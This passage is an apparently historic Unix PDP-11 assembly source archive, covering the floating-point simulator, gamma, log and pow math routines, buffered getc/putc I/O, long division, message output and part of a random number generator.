	badins		/ 1703xx - stst
	i.clrx		/ 1704xx
	i.tstx		/ 1705xx
	i.absx		/ 1706xx
	i.negx		/ 1707xx
	.text

class3:
	cmp	r5,$5000
	blt	1f
	mov	r5,r2
	clrb	r2
	cmp	r2,$6400
	blt	2f
	sub	$1400,r2
2:
	cmp	r2,$5000
	bne	2f
	jsr	r1,fsrc; mod0rx; mod242
	br	3f
2:
	cmp	r2,$5400
	bne	2f
	jsr	r1,fsrc; mod0ra; mod24i
	br	3f
2:
	jsr	r1,fsrc; mod0f; mod24d
	br	3f
1:
	jsr	r1,fsrc; mod0f; mod24f
3:
	jsr	pc,freg
	mov	r2,r5
	clrb	r4
	swab	r4
	asl	r4
	jsr	pc,*1f(r4)
	br	sret

	.data
1:
	badins		/ 1700xx
	badins		/ 1704xx
	i.mulx		/ 1710xx
	i.modx		/ 1714xx
	i.addx		/ 1720xx
	i.ldx		/ 1724xx
	i.subx		/ 1730xx
	i.cmpx		/ 1734xx
	i.stx		/ 1740xx
	i.divx		/ 1744xx
	i.stexp		/ 1750xx
	i.stcxj		/ 1754xx
	i.stcxy		/ 1760xx
	i.ldexp		/ 1764xx
	i.ldcjx		/ 1770xx
	i.ldcyx		/ 1774xx
	.text

i.cfcc:
	mov	fpsr,r0
	bic	$!17,r0
	mov	r0,sps
	br	ret

i.setf:
	bic	$m.ext,fpsr
	br	ret

i.setd:
	bis	$m.ext,fpsr
	br	ret

i.seti:
	bic	$m.lngi,fpsr
	br	ret

i.setl:
	bis	$m.lngi,fpsr
	br	ret

badins:
	inc	trapins
	br	ret

sret:
	mov	$fpsr,r0
	bic	$17,(r0)
	tst	(r5)
	bpl	1f
	bis	$10,(r0)
	br	ret
1:
	bne	ret
	bis	$4,(r0)

ret:
	mov	$sr1,r0
	mov	(r0)+,r1
	mov	(r0)+,r2
	mov	(r0)+,r3
	mov	(r0)+,r4
	mov	(r0)+,r5
	mov	(r0)+,sp
	mov	sr0,r0
	mov	sps,-(sp)
	mov	spc,-(sp)
	tst	trapins
	bne	1f
	inc	reenter
	rti
1:
	bpt

freg:
	mov	r5,r2
	bic	$!300,r2
	asr	r2
	asr	r2
	asr	r2
	add	$ac0,r2
	rts	pc

fsrc:
	mov	r5,r3
	bic	$!7,r3			/ register
	asl	r3
	add	$sr0,r3
	mov	r5,r0
	bic	$!70,r0			/ mode
	asr	r0
	asr	r0
	jmp	*1f(r0)

	.data
1:
	mod0
	mod1
	mod2
	mod3
	mod4
	mod5
	mod6
	mod7
	.text

mod24f:
	mov	$4,r0
	bit	$m.ext,fpsr
	beq	1f
	add	$4,r0
1:
	rts	pc

mod24d:
	mov	$8,r0
	bit	$m.ext,fpsr
	beq	1f
	sub	$4,r0
1:
	rts	pc

mod242:
	mov	$2,r0
	rts	pc

mod24i:
	mov	$2,r0
	bit	$m.lngi,fpsr
	beq	1f
	add	$2,r0
1:
	rts	pc

mod0:
	jmp	*(r1)+

mod0f:
	sub	$sr0,r3			/ get fp ac
	cmp	r3,$6*2
	bhis	badi1
	asl	r3
	asl	r3
	add	$ac0,r3
	tst	(r1)+
	rts	r1

mod0ra:
	bit	$m.lngi,fpsr
	bne	badi1

mod0r:
	cmp	r3,$ssp
	bhis	badi1
mod0rx:
	tst	(r1)+
	rts	r1

mod1:
	cmp	r3,$spc
	beq	badi1
	mov	(r3),r3
	br	check

mod2:
	mov	(r3),-(sp)
	jsr	pc,*2(r1)
	cmp	r3,$spc
	bne	1f
	mov	$2,r0
	mov	*(r3),pctmp
	mov	$pctmp,(sp)
1:
	add	r0,(r3)
	mov	(sp)+,r3
	br	check

mod3:
	mov	*(r3),-(sp)
	add	$2,(r3)
	mov	(sp)+,r3
	br	check

mod4:
	cmp	r3,$spc		/ test pc
	beq	badi1
	jsr	pc,*2(r1)
	sub	r0,(r3)
	mov	(r3),r3
	br	check

mod5:
	cmp	r3,$spc
	beq	badi1
	sub	$2,(r3)
	mov	*(r3),r3
	br	check

mod6:
	mov	*spc,-(sp)
	add	$2,spc
	add	(r3),(sp)
	mov	(sp)+,r3
	br	check

mod7:
	jsr	r1,mod6; ..; ..
	mov	(r3),r3
	br	check

badi1:
	jmp	badins

check:
	bit	$1,r3
	bne	badi1
	cmp	(r1)+,(r1)+
	rts	r1

setab:
	mov	$asign,r0
	jsr	pc,seta
	mov	r3,r2
	mov	$bsign,r0

seta:
	clr	(r0)
	mov	(r2)+,r1
	mov	r1,-(sp)
	beq	1f
	blt	2f
	inc	(r0)+
	br	3f
2:
	dec	(r0)+
3:
	bic	$!177,r1
	bis	$200,r1
	br	2f
1:
	clr	(r0)+
2:
	mov	r1,(r0)+
	mov	(r2)+,(r0)+
	bit	$m.ext,fpsr
	beq	2f
	mov	(r2)+,(r0)+
	mov	(r2)+,(r0)+
	br	3f
2:
	clr	(r0)+
	clr	(r0)+
3:
	mov	(sp)+,r1
	asl	r1
	clrb	r1
	swab	r1
	sub	$200,r1
	mov	r1,(r0)+	/ exp
	rts	pc

norm:
	mov	$areg,r0
	mov	(r0)+,r1
	mov	r1,-(sp)
	mov	(r0)+,r2
	bis	r2,(sp)
	mov	(r0)+,r3
	bis	r3,(sp)
	mov	(r0)+,r4
	bis	r4,(sp)+
	bne	1f
	clr	asign
	rts	pc
1:
	bit	$!377,r1
	beq	1f
	clc
	ror	r1
	ror	r2
	ror	r3
	ror	r4
	inc	(r0)
	br	1b
1:
	bit	$200,r1
	bne	1f
	asl	r4
	rol	r3
	rol	r2
	rol	r1
	dec	(r0)
	br	1b
1:
	mov	r4,-(r0)
	mov	r3,-(r0)
	mov	r2,-(r0)
	mov	r1,-(r0)
	rts	pc

-- /usr/source/s3/fp2.s mode=0100664 uid=3 gid=3 atime=174923965 mtime=169260612 --
/ fp2 -- floating point simulation

i.ldx:
	mov	(r3)+,(r2)+
	mov	(r3)+,(r2)+
	bit	$m.ext,fpsr
	beq	1f
	mov	(r3)+,(r2)+
	mov	(r3)+,(r2)+
	rts	pc
1:
	clr	(r2)+
	clr	(r2)+
	rts	pc

i.stx:
	mov	(r2)+,(r3)+
	mov	(r2)+,(r3)+
	bit	$m.ext,fpsr
	beq	1f
	mov	(r2)+,(r3)+
	mov	(r2)+,(r3)+
1:
	rts	pc

i.clrx:
	clr	(r3)+
	clr	(r3)+
	bit	$m.ext,fpsr
	beq	1f
	clr	(r3)+
	clr	(r3)+
1:
	rts	pc

i.negx:
	tst	(r3)
	beq	1f
	add	$100000,(r3)
1:
	rts	pc

i.absx:
	bic	$!77777,(r3)
	rts	pc

i.tstx:
	rts	pc

i.cmpx:
	mov	$areg,r5
	tst	(r2)
	bge	1f
	tst	(r3)
	bge	1f
	cmp	(r2),(r3)
	bgt	4f
	blt	3f
1:
	cmp	(r2)+,(r3)+
	bgt	3f
	blt	4f
	cmp	(r2)+,(r3)+
	bne	1f
	bit	$m.ext,fpsr
	beq	2f
	cmp	(r2)+,(r3)+
	bne	1f
	cmp	(r2)+,(r3)+
	beq	2f
1:
	bhi	3f
4:
	mov	$1,(r5)
	rts	pc
3:
	mov	$-1,(r5)
	rts	pc
2:
	clr	(r5)
	rts	pc

i.ldcyx:
	mov	(r3)+,(r2)+
	mov	(r3)+,(r2)+
	bit	$m.ext,fpsr
	bne	1f
	mov	(r3)+,(r2)+
	mov	(r3)+,(r2)+
	rts	pc
1:
	clr	(r2)+
	clr	(r2)+
	rts	pc

i.stcxy:
	mov	(r2)+,(r3)+
	mov	(r2)+,(r3)+
	bit	$m.ext,fpsr
	bne	1f
	clr	(r3)+
	clr	(r3)+
1:
	rts	pc

i.ldcjx:
	mov	$asign,r0
	mov	$1,(r0)+
	mov	(r3)+,(r0)+
	bit	$m.lngi,fpsr
	beq	1f
	mov	(r3)+,(r0)+
	clr	(r0)+
	clr	(r0)+
	mov	$32.-8,(r0)+
	jmp	saret
1:
	clr	(r0)+
	clr	(r0)+
	clr	(r0)+
	mov	$16.-8,(r0)
	jmp	saret

i.stcxj:
	mov	r3,r5
	mov	$asign,r0
	jsr	pc,seta
	mov	$areg,r0
	mov	(r0)+,r1
	mov	(r0)+,r2
	mov	(r0)+,r3
	mov	aexp,r0
1:
	cmp	r0,$48.-8
	bge	1f
	clc
	ror	r1
	ror	r2
	ror	r3
	inc	r0
	br	1b
1:
	bgt	xoflo
	tst	r1
	bne	xoflo
1:
	bit	$m.lngi,fpsr
	beq	1f
	tst	asign
	bge	2f
	neg	r3
	adc	r2
	bcs	2f
	neg	r2
2:
	mov	r2,(r5)
	mov	r3,2(r5)
	rts	pc
1:
	tst	r2
	bne	xoflo
	tst	asign
	bge	2f
	neg	r3
2:
	mov	r3,(r5)
	rts	pc

xoflo:
	bis	$1,fpsr			/ set fixed overflow (carry)
	jmp	ret

i.ldexp:
	mov	$asign,r0
	jsr	pc,seta
	mov	(r3),aexp
	jsr	pc,reta
	jmp	sret

i.stexp:
	mov	$asign,r0
	jsr	pc,seta
	mov	aexp,(r3)
	mov	r3,r5
	jmp	sret

i.ldfps:
	mov	(r3),fpsr
	jmp	ret

i.stfps:
	mov	fpsr,(r3)
	jmp	ret

-- /usr/source/s3/fp3.s mode=0100664 uid=3 gid=3 atime=174923965 mtime=169260612 --
/ fp3 -- floating simulation

i.addx:
	jsr	pc,setab
	br	1f

i.subx:
	jsr	pc,setab
	neg	bsign
1:
	tst	bsign
	beq	reta
	tst	asign
	beq	retb
	mov	areg+8,r1
	sub	breg+8,r1
	blt	1f
	beq	2f
	cmp	r1,$56.
	bge	reta
	mov	$breg,r0
	br	4f
1:
	neg	r1
	cmp	r1,$56.
	bge	retb
	mov	$areg,r0
4:
	mov	r1,-(sp)
	mov	(r0)+,r1
	mov	(r0)+,r2
	mov	(r0)+,r3
	mov	(r0)+,r4
	add	(sp),(r0)
1:
	clc
	ror	r1
	ror	r2
	ror	r3
	ror	r4
	dec	(sp)
	bgt	1b
	mov	r4,-(r0)
	mov	r3,-(r0)
	mov	r2,-(r0)
	mov	r1,-(r0)
	tst	(sp)+
2:
	mov	$areg+8,r1
	mov	$breg+8,r2
	mov	$4,r0
	cmp	asign,bsign
	bne	4f
	clc
1:
	adc	-(r1)
	bcs	3f
	add	-(r2),(r1)
2:
	dec	r0
	bne	1b
	br	5f
3:
	add	-(r2),(r1)
	sec
	br	2b
	br	5f
4:
	clc
1:
	sbc	-(r1)
	bcs	3f
	sub	-(r2),(r1)
2:
	dec	r0
	bne	1b
	br	5f
3:
	sub	-(r2),(r1)
	sec
	br	2b

saret:
	mov	$areg,r1
5:
	tst	(r1)
	bge	3f
	mov	$areg+8,r1
	mov	$4,r0
	clc
1:
	adc	-(r1)
	bcs	2f
	neg	(r1)
2:
	dec	r0
	bne	1b
	neg	-(r1)
3:
	jsr	pc,norm
	br	reta

retb:
	mov	$bsign,r1
	mov	$asign,r2
	mov	$6,r0
1:
	mov	(r1)+,(r2)+
	dec	r0
	bne	1b

reta:
	mov	r5,r2
	mov	$asign,r0
	tst	(r0)
	beq	unflo
	mov	aexp,r1
	cmp	r1,$177
	bgt	ovflo
	cmp	r1,$-177
	blt	unflo
	add	$200,r1
	swab	r1
	clc
	ror	r1
	tst	(r0)+
	bge	1f
	bis	$100000,r1
1:
	bic	$!177,(r0)
	bis	(r0)+,r1
	mov	r1,(r2)+
	mov	(r0)+,(r2)+
	bit	$m.ext,fpsr
	beq	1f
	mov	(r0)+,(r2)+
	mov	(r0)+,(r2)+
1:
	rts	pc

unflo:
	clr	(r2)+
	clr	(r2)+
	bit	$m.ext,fpsr
	beq	1f
	clr	(r2)+
	clr	(r2)+
1:
	rts	pc

ovflo:
	bis	$2,fpsr			/ set v-bit (overflow)
	jmp	ret

i.mulx:
	jsr	pc,i.mul
	br	saret

i.modx:
	jsr	pc,i.mul
	jsr	pc,norm
	mov	$asign,r0
	mov	$bsign,r1
	mov	$6,r2
1:
	mov	(r0)+,(r1)+
	dec	r2
	bne	1b
	clr	r0		/ count
	mov	$200,r1		/ bit
	clr	r2		/ reg offset
1:
	cmp	r0,aexp
	bge	2f		/ in fraction
	bic	r1,areg(r2)
	br	3f
2:
	bic	r1,breg(r2)
3:
	inc	r0
	clc
	ror	r1
	bne	1b
	mov	$100000,r1
	add	$2,r2
	cmp	r2,$8
	blt	1b
	jsr	pc,norm
	jsr	pc,reta
	cmp	r5,$ac1
	beq	1f
	cmp	r5,$ac3
	beq	1f
	bit	$200,breg
	bne	2f
	clr	bsign
2:
	add	$8,r5
	jsr	pc,retb
	sub	$8,r5
1:
	rts	pc

i.divx:
	jsr	pc,setab
	tst	bsign
	beq	ovflo
	sub	bexp,aexp
	jsr	pc,xorsign
	mov	r5,-(sp)
	mov	$areg,r0
	mov	(r0),r1
	clr	(r0)+
	mov	(r0),r2
	clr	(r0)+
	mov	(r0),r3
	clr	(r0)+
	mov	(r0),r4
	clr	(r0)+
	mov	$areg,r5
	mov	$400,-(sp)
1:
	mov	$breg,r0
	cmp	(r0)+,r1
	blt	2f
	bgt	3f
	cmp	(r0)+,r2
	blo	2f
	bhi	3f
	cmp	(r0)+,r3
	blo	2f
	bhi	3f
	cmp	(r0)+,r4
	bhi	3f
2:
	mov	$breg,r0
	sub	(r0)+,r1
	clr	-(sp)
	sub	(r0)+,r2
	adc	(sp)
	clr	-(sp)
	sub	(r0)+,r3
	adc	(sp)
	sub	(r0)+,r4
	sbc	r3
	adc	(sp)
	sub	(sp)+,r2
	adc	(sp)
	sub	(sp)+,r1
	bis	(sp),(r5)
3:
	asl	r4
	rol	r3
	rol	r2
	rol	r1
	clc
	ror	(sp)
	bne	1b
	mov	$100000,(sp)
	add	$2,r5
	cmp	r5,$areg+8
	blo	1b
	tst	(sp)+
	mov	(sp)+,r5
	jmp	saret


i.mul:
	jsr	pc,setab
	add	bexp,aexp
	dec	aexp
	jsr	pc,xorsign
	mov	r5,-(sp)
	mov	$breg+4,r5
	bit	$m.ext,fpsr
	beq	1f
	add	$4,r5
1:
	clr	r0
	clr	r1
	clr	r2
	clr	r3
	clr	r4
1:
	asl	r0
	bne	2f
	inc	r0
	tst	-(r5)
2:
	cmp	r0,$400
	bne	2f
	cmp	r5,$breg
	bhi	2f
	mov	$areg,r0
	mov	r1,(r0)+
	mov	r2,(r0)+
	mov	r3,(r0)+
	mov	r4,(r0)+
	mov	(sp)+,r5
	rts	pc
2:
	clc
	ror	r1
	ror	r2
	ror	r3
	ror	r4
	bit	r0,(r5)
	beq	1b
	mov	r0,-(sp)
	mov	$areg,r0
	add	(r0)+,r1
	clr	-(sp)
	add	(r0)+,r2
	adc	(sp)
	clr	-(sp)
	add	(r0)+,r3
	adc	(sp)
	add	(r0)+,r4
	adc	r3
	adc	(sp)
	add	(sp)+,r2
	adc	(sp)
	add	(sp)+,r1
	mov	(sp)+,r0
	br	1b

xorsign:
	cmp	asign,bsign
	beq	1f
	mov	$-1,asign
	rts	pc
1:
	mov	$1,asign
	rts	pc

-- /usr/source/s3/fpx.s mode=0100664 uid=3 gid=3 atime=174923965 mtime=169260612 --
/ fpx -- floating point simulation

.data
reenter: 1

.bss
asign:	.=.+2
areg:	.=.+8
aexp:	.=.+2
bsign:	.=.+2
breg:	.=.+8
bexp:	.=.+2

fpsr:	.=.+2
trapins: .=.+2

ac0:	.=.+8.
ac1:	.=.+8.
ac2:	.=.+8.
ac3:	.=.+8.
ac4:	.=.+8.
ac5:	.=.+8.

sr0:	.=.+2
sr1:	.=.+2
	.=.+2
	.=.+2
	.=.+2
	.=.+2
ssp:	.=.+2
spc:	.=.+2
sps:	.=.+2
pctmp:	.=.+8

-- /usr/source/s3/gamma.s mode=0110664 uid=3 gid=3 atime=174923969 mtime=169260612 --
.globl gamma, _gamma, signgam, _signgam
.globl	log, sin
half = 040000
one = 40200
two = 40400
eight = 41000
large = 77777
ldfps = 170100^tst
stfps = 170200^tst
/
/	gamma computes the log of the abs of the gamma function.
/	gamma accepts its argument and returns its result
/	in fr0.  The carry bit is set if the result is
/	too large to represent.
/	The sign of the gamma function is
/	returned in the globl cell signgam.
/
/	The coefficients for expansion around zero
/	are #5243 from Hart & Cheney; for expansion
/	around infinity they are #5404.
/
/	movf	arg,fr0
/	jsr	pc,gamma
/	movf	fr0,...
/

_gamma:
	mov	r5,-(sp)
	mov	sp,r5
	movf	4(r5),fr0
	jsr	pc,gamma
	mov	(sp)+,r5
	rts	pc
gamma:
	stfps	-(sp)
	ldfps	$200
	clr	signgam
	movf	fr1,-(sp)
	tstf	fr0
	cfcc
	ble	negative
	cmpf	$eight,fr0
	cfcc
	blt	asymptotic
	jsr	pc,regular
/
lret:
	jsr	pc,log
	bec	ret
	4
ret:
	movf	(sp)+,fr1
	ldfps	(sp)+
	clc
	rts	pc
/
erret:
	movf	$large,fr0
	movf	(sp)+,fr1
	ldfps	(sp)+
	sec
	rts	pc

/
/	here for positive x > 8
/	the log of the gamma function is
/	approximated directly by the asymptotic series.
/
asymptotic:
	movf	fr0,-(sp)
	movf	fr0,fr1
	jsr	pc,log
	subf	$half,fr1
	mulf	fr1,fr0
	subf	(sp),fr0
	addf	goobie,fr0
/
	movf	$one,fr1
	divf	(sp)+,fr1
	movf	fr0,-(sp)
	movf	fr1,-(sp)
	mulf	fr1,fr1
/
	mov	r0,-(sp)
	mov	$p5p,r0
	mov	$5,-(sp)
	movf	*(r0)+,fr0
1:
	mulf	fr1,fr0
	addf	*(r0)+,fr0
	dec	(sp)
	bne	1b
	tst	(sp)+
	mov	(sp)+,r0
	mulf	(sp)+,fr0
	addf	(sp)+,fr0
	br	ret

/
/	here on negative
/	the negative gamma is computed
/	in terms of the pos gamma.
/
negative:
	absf	fr0
	movf	fr0,fr1
	mulf	pi,fr0
	jsr	pc,sin
	negf	fr0
	cfcc
	beq	erret
	bgt	1f
	inc	signgam
	absf	fr0
1:
	mov	signgam,-(sp)
	mulf	fr1,fr0
	divf	pi,fr0
	jsr	pc,log
	movf	fr0,-(sp)
	movf	fr1,fr0
	jsr	pc,gamma
	addf	(sp)+,fr0
	negf	fr0
	mov	(sp)+,signgam
	br	ret

/
/	control comes here for arguments less than 8.
/	if the argument is 2<x<3 then compute by
/	a rational approximation.
/	if x<2 or x>3 then the argument
/	is reduced in range by the formula
/	gamma(x+1) = x*gamma(x)
/
regular:
	subf	$two,fr0
	cfcc
	bge	1f
	addf	$two,fr0
	movf	fr0,-(sp)
	addf	$one,fr0
	movf	fr0,-(sp)
	addf	$one,fr0
	jsr	pc,regular
	divf	(sp)+,fr0
	divf	(sp)+,fr0
	rts	pc
1:
	cmpf	$one,fr0
	cfcc
	bgt	1f
	addf	$one,fr0
	movf	fr0,-(sp)
	subf	$two,fr0
	jsr	pc,1b
	mulf	(sp)+,fr0
	rts	pc
1:
	movf	fr2,-(sp)
	mov	r0,-(sp)
	mov	$p4p,r0
	mov	$6,-(sp)
	movf	fr0,fr2
	movf	*(r0)+,fr0
1:
	mulf	fr2,fr0
	addf	*(r0)+,fr0
	dec	(sp)
	bne	1b
	mov	$7,(sp)
	movf	fr2,fr1
	br	2f
1:
	mulf	fr2,fr1
2:
	addf	*(r0)+,fr1
	dec	(sp)
	bne	1b
	tst	(sp)+
	mov	(sp)+,r0
	divf	fr1,fr0
	movf	(sp)+,fr2
	rts	pc
/
.data
p4p:
	p6;p5;p4;p3;p2;p1;p0
	q6;q5;q4;q3;q2;q1;q0

/	p6 = -.67449 50724 59252 89918 d1
/	p5 = -.50108 69375 29709 53015 d2
/	p4 = -.43933 04440 60025 67613 d3
/	p3 = -.20085 27401 30727 91214 d4
/	p2 = -.87627 10297 85214 89560 d4
/	p1 = -.20886 86178 92698 87364 d5
/	p0 = -.42353 68950 97440 89647 d5
/	q7 = 1.0 d0
/	q6 = -.23081 55152 45801 24562 d2
/	q5 = +.18949 82341 57028 01641 d3
/	q4 = -.49902 85266 21439 04834 d3
/	q3 = -.15286 07273 77952 20248 d4
/	q2 = +.99403 07415 08277 09015 d4
/	q1 = -.29803 85330 92566 49932 d4
/	q0 = -.42353 68950 97440 90010 d5
p1:
	143643
	26671
	36161
	72154
p2:
	143410
	165327
	54121
	172630
p3:
	142773
	10340
	74264
	152066
p4:
	142333
	125113
	176657
	75740
p5:
	141510
	67515
	65111
	24263
p6:
	140727
	153242
	163350
	32217
p0:
	144045
	70660
	101665
	164444
q1:
	143072
	43052
	50302
	136745
q2:
	43433
	50472
	145404
	175462
q3:
	142677
	11556
	144553
	154177
q4:
	142371
	101646
	141245
	11264
q5:
	42075
	77614
	43022
	27573
q6:
	141270
	123404
	76130
	12650
q0:
	144045
	70660
	101665
	164444

p5p:
	s5;s4;s3;s2;s1;s0
/
/	s5 = -.16334 36431 d-2
/	s4 = +.83645 87892 2 d-3
/	s3 = -.59518 96861 197 d-3
/	s2 = +.79365 05764 93454 d-3
/	s1 = -.27777 77777 35865 004 d-2
/	s0 = +.83333 33333 33331 01837 d-1
/	goobie = 0.91893 85332 04672 74178 d0
s5:
	135726
	14410
	15074
	17706
s4:
	35533
	42714
	111634
	76770
s3:
	135434
	3200
	171173
	156141
s2:
	35520
	6375
	12373
	111437
s1:
	136066
	5540
	132625
	63540
s0:
	37252
	125252
	125252
	125047
goobie:
	40153
	37616
	41445
	172645
pi:
	40511
	7732
	121041
	64302
.bss
_signgam:
signgam:.=.+2
-- /usr/source/s3/get.s mode=0100664 uid=3 gid=3 atime=174923971 mtime=169260612 --
/ getw/getc -- get words/characters from input file
/ fopen -- open a file for use by get(c|w)
/
/ calling sequences --
/
/   mov $filename,r0
/   jsr r5,fopen; ioptr
/
/  on return ioptr buffer is set up or error bit is set if
/  file could not be opened.
/
/   jsr r5,get(c|w)1; ioptr
/
/  on return char/word is in r0; error bit is
/  set on error or end of file.
/
/  ioptr is the address of a 518-byte buffer
/  whose layout is as follows:
/
/  ioptr: .=.+2    / file descriptor
/         .=.+2    / charact+2    / pointer to next character (reset if no. chars=0)
/         .=.+512. / the buffer

	.globl	getc,getw,fopen

fopen:
	mov	r1,-(sp)
	mov	(r5)+,r1
	mov	r0,0f
	sys	0; 9f
.data
9:
	sys	open; 0:..; 0
.text
	bes	1f
	mov	r0,(r1)+
	clr	(r1)+
	mov	(sp)+,r1
	rts	r5
1:
	mov	$-1,(r1)
	mov	(sp)+,r1
	sec
	rts	r5

.data
getw:
	mov	(r5),9f
	mov	(r5)+,8f
	jsr	r5,getc; 8:..
	bec	1f
	rts	r5
1:
	mov	r0,-(sp)
	jsr	r5,getc; 9:..
	swab	r0
	bis	(sp)+,r0
	rts	r5
.text

getc:
	mov	r1,-(sp)
	mov	(r5)+,r1
	dec	2(r1)
	bge	1f
	mov	r1,r0
	add	$6,r0
	mov	r0,0f
	mov	r0,4(r1)
	mov	(r1),r0
	sys	0; 9f
.data
9:
	sys	read; 0:..; 512.
.text
	bes	2f
	tst	r0
	bne	3f
2:
	mov	(sp)+,r1
	sec
	rts	r5
3:
	dec	r0
	mov	r0,2(r1)
1:
	clr	r0
	bisb	*4(r1),r0
	inc	4(r1)
	mov	(sp)+,r1
	rts	r5

-- /usr/source/s3/ldiv.s mode=0100664 uid=3 gid=3 atime=174923973 mtime=169260612 --
/ C library-- long divide/remainder

.globl	_ldiv, _ldivr
.globl	_lrem

_ldiv:
	mov	2(sp),r0
	mov	4(sp),r1
	div	6(sp),r0
	mov	r1,_ldivr
	rts	pc

_lrem:
	mov	2(sp),r0
	mov	4(sp),r1
	div	6(sp),r0
	mov	r1,r0
	rts	pc

.bss
_ldivr:	.=.+2
-- /usr/source/s3/log.s mode=0100664 uid=3 gid=3 atime=174923975 mtime=169260612 --
.globl log, _log
ldfps = 170100^tst
stfps = 170200^tst
ldexp = 176400^movif
stexp = 175000^movfi
/
/	log accepts its argument and returns its result
/	in fr0.  The carry bit is set if the argument is
/	zero or negative.
/	The coefficients are #2705 from Hart & Cheney.
/
/	movf	arg,fr0
/	jsr	pc,log
/	movf	fr0,...
/
_log:
	mov	r5,-(sp)
	mov	sp,r5
	movf	4(r5),fr0
	jsr	pc,log
	mov	(sp)+,r5
	rts	pc

log:
	tstf	fr0
	cfcc
	bgt	1f
	movf	$bigneg,fr0	/return -(big) on error
	sec
	rts	pc
1:
	stfps	-(sp)
	ldfps	$200		/di mode
	movf	fr2,-(sp)
	movf	fr1,-(sp)
/
	stexp	fr0,-(sp)	/scale
	ldexp	$0,fr0
	cmpf	sqrt2o2,fr0
	cfcc
	blt	1f
	ldexp	$1,fr0
	dec	(sp)
1:
	movf	fr0,fr1		/(1/2)^(1/2) < x < 2^(1/2)
	subf	$one,fr0
	addf	$one,fr1
	divf	fr1,fr0		/z = (x-1)/(x+1)
	movf	fr0,fr1
	mulf	fr0,fr1		/z^2
/
	movf	p3,fr2
	mulf	fr1,fr2
	addf	p2,fr2
	mulf	fr1,fr2
	addf	p1,fr2
	mulf	fr1,fr2
	addf	p0,fr2
	mulf	fr2,fr0		/zP(z)
/
	movf	fr1,fr2
	addf	q2,fr2
	mulf	fr1,fr2
	addf	q1,fr2
	mulf	fr1,fr2
	addf	q0,fr2		/Q(z)
/
	divf	fr2,fr0		/zP(z)/Q(z)
	movif	(sp)+,fr1
	mulf	log2,fr1
	addf	fr1,fr0
/
	movf	(sp)+,fr1
	movf	(sp)+,fr2
	ldfps	(sp)+
	rts	pc
/
/
one	= 40200
bigneg	= 177777
/
.data
sqrt2o2: 40065; 02363; 31771; 157145
log2:	 40061; 71027;173721;147572
/
p0:	141300; 16201; 02154; 10216
p1:	 41367;124211; 21611;114442
p2:	141032; 31773; 64222; 40261
p3:	 37727;114303;110107;114145
/
q0:	141100; 16201; 02154; 10216
q1:	 41233;154404;136454; 22153
q2:	141016;111747; 07541; 52530
/
/
/p0 = -.24013 91795 59210 50986 8484  d2
/p1 =  .30957 29282 15376 50062 264   d2
/p2 = -.96376 90933 68686 59324       d1
/p3 =  .42108 73712 17979 7145        d0
/
/q0 = -.12006 95897 79605 25471 7525  d2
/q1 =  .19480 96607 00889 73051 623   d2
/q2 = -.89111 09027 93783 12337       d1
/q3 =  .1                             d1
/
-- /usr/source/s3/mesg.s mode=0100664 uid=3 gid=3 atime=174923978 mtime=169260612 --
.globl	mesg

/ usage:
/   jsr r5,mesg
/       <string ending in \0>
/      .even
/   ...
/
/ string is output onto $1
/

mesg:
	mov	r0,-(sp)
	mov	r5,r0
	mov	r5,0f
1:
	tstb	(r5)+
	bne	1b
	sub	r5,r0
	com	r0
	mov	r0,0f+2
	mov	$1,r0
	sys	0; 9f
.data
9:
	sys	write; 0:..; ..
.text
	inc	r5
	bic	$1,r5
	mov	(sp)+,r0
	rts	r5

-- /usr/source/s3/pow.s mode=0100664 uid=3 gid=3 atime=174923979 mtime=169260612 --
.globl	pow, _pow
.globl	log, exp

_pow:
	mov	r5,-(sp)
	mov	sp,r5
	movf	4(r5),fr0
	movf	12.(r5),fr1
	jsr	pc,pow
	mov	(sp)+,r5
	rts	pc

pow:

/ 0^0~ is 0

	tstf	fr0
	cfcc
	bne	1f
	tstf	fr1
	cfcc
	beq	bad
	rts	pc
1:

/ -^i is +^i fixed sign

	bpl	1f
	movf	fr1,-(sp)
	modf	$one,fr1
	cfcc
	bne	bad1
	movf	(sp)+,fr1
	absf	fr0
	jsr	pc,1f
	bes	bad
	movf	fr1,-(sp)
	modf	$half,fr1
	cfcc
	beq	2f
	negf	fr0
2:
	movf	(sp)+,fr1
	rts	pc
1:
	jsr	pc,log
	bes	1f
	mulf	 fr1,fr0
	jsr	pc,exp
1:
	rts	pc

bad1:
	movf	(sp)+,fr1
bad:
	sec
	rts	pc

one = 40200
half = 40000
-- /usr/source/s3/put.s mode=0100664 uid=3 gid=3 atime=174923982 mtime=169260612 --
/ putw/putc -- write words/characters on output file
/
/ fcreat -- create an output file for use by put(w|c)
/
/ calling sequences --
/
/   mov $filename,r0
/   jsr r5,fcreat; ioptr
/
/ on return ioptr is set up for use by put or error
/ bit is set if file could not be created.
/
/   mov(b) thing,r0
/   jsr r5,put(w|c)1; ioptr
/
/ the character or word is written out.
/
/   jsr r5,flush; ioptr
/
/ the buffer is fled.
/

	.globl	putc, putw, flush, fcreat

fcreat:
	mov	r1,-(sp)
	mov	(r5)+,r1
	mov	r0,0f
	sys	0; 9f
.data
9:
	sys	creat; 0:..; 666
.text
	bes	1f
	mov	r0,(r1)+
2:
	clr	(r1)+
	clr	(r1)+
	mov	(sp)+,r1
	rts	r5
1:
	mov	$-1,(r1)+
	mov	(sp)+,r1
	sec
	rts	r5

.data
putw:
	mov	(r5),8f
	mov	(r5)+,9f
	mov	r0,-(sp)
	jsr	r5,putc; 8:..
	mov	(sp)+,r0
	swab	r0
	jsr	r5,putc; 9:..
	rts	r5
.text

putc:
	mov	r1,-(sp)
	mov	(r5)+,r1
1:
	dec	2(r1)
	bge	1f
	mov	r0,-(sp)
	jsr	pc,fl
	mov	(sp)+,r0
	br	1b
1:
	movb	r0,*4(r1)
	inc	4(r1)
	mov	(sp)+,r1
	rts	r5

flush:
	mov	r0,-(sp)
	mov	r1,-(sp)
	mov	(r5)+,r1
	jsr	pc,fl
	mov	(sp)+,r1
	mov	(sp)+,r0
	rts	r5

fl:
	mov	r1,r0
	add	$6,r0
	mov	r0,-(sp)
	mov	r0,0f
	mov	4(r1),0f+2
	beq	1f
	sub	(sp),0f+2
	mov	(r1),r0
	sys	0; 9f
.data
9:
	sys	write; 0:..; ..
.text
1:
	mov	(sp)+,4(r1)
	mov	$512.,2(r1)
	rts	pc

-- /usr/source/s3/rand.s mode=0100664 uid=3 gid=3 atime=174923984 mtime=169260612 --
/ random fixed point number generator

.globl	rand, srand
.globl	_rand, _srand

_srand:
	mov	2(sp),ranx
	rts	pc

srand:
	mov	r0,ranx
	rts	pc

_rand:
rand:
	mov	r1,-(sp)
	mov	ranx,r1
	mpy	$13077.,r1
	add	$6925.,r1
